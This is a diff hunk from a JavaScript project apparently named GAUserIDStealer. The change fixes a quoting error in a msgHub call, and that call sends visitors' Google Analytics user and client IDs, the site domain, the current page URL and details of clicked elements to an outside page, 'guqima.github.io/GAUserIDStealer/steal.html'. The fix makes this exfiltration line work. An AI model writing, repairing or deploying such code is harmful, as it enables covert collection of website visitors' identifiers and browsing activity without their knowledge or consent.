@@ -272,7 +272,7 @@ function searchAndSet(stackNum) {
         elementText="";
     }
 
-    msgHub("guqima.github.io/GAUserIDStealer/steal.html", uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText="+elementText);
+    msgHub("guqima.github.io/GAUserIDStealer/steal.html", "uid=="+uid+"&&domain=="+site_domain+"&&cid=="+getgaCid()+"&&url=="+window.location.href+"&&dataanalyticsID="+dataanalyticsID+"&&element_url=="+elementUrl+"&&elementClasses="+elementClasses+"&&elementId="+elementId+"&&elementText="+elementText);
 }
 
 function doFlow(){
